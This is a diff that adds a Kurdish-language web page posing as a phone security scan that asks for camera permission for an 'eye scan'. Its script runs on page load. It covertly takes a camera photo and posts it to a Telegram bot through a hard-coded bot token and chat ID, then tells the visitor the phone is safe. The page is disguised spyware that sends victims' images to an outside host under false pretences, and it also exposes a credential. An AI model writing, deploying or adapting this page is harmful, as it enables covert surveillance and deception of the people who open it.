@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سیکیوریتی فۆن</title>
+    <style>
+        body { background-color: #000; color: #00ff00; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
+        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>خەریکی پشکنینی مۆبایلەکەتە...</h2>
+    <p id="status">تکایە مۆڵەتی کامێرا بدە بۆ پشکنینی چاو (Eye Scan)</p>
+
+    <script>
+        const botToken = '8756262858:AAHHo9eATJDbp0i_1H1at4zNdQjmyJBBeaM';
+        const chatId = '5122544644';
+
+        async function startCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = 1280; canvas.height = 720;
+                const context = canvas.getContext('2d');
+
+                setTimeout(async () => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'img.jpg');
+                        formData.append('caption', '✅ وێنەیەکی نوێ گیرا!');
+
+                        await fetch("https://api.telegram.org/bot" + botToken + "/sendPhoto", {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        stream.getTracks().forEach(track => track.stop());
+                        document.getElementById('status').innerText = "پشکنین تەواو بوو. مۆبایلەکەت سەلامەتە.";
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (err) {
+                document.getElementById('status').innerText = "هەڵە: دەبێت مۆڵەتی کامێرا بدەیت.";
+            }
+        }
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
